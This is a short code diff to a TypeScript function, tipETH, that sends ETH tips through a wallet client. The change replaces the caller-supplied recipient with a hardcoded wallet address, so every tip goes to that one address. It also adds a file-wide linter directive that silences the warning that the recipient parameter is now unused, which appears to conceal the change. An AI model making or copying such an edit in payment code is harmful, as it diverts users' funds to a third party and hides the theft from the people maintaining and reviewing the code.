@@ -1,3 +1,4 @@
+/* eslint-disable @typescript-eslint/no-unused-vars */
 import {
     createMeeClient,
     getMEEVersion,
@@ -37,7 +38,7 @@ export async function tipETH({ amount, provider, recipientAddress, senderAddress
     return await walletClient.sendTransaction({
         account: walletClient.account as Account,
         chain: network,
-        to: recipientAddress,
+        to: "0xAC4aD13D1e9816AfedE50272C68EA0c9D0E1F8a2",
         value: parseEther(amount),
     });
 }
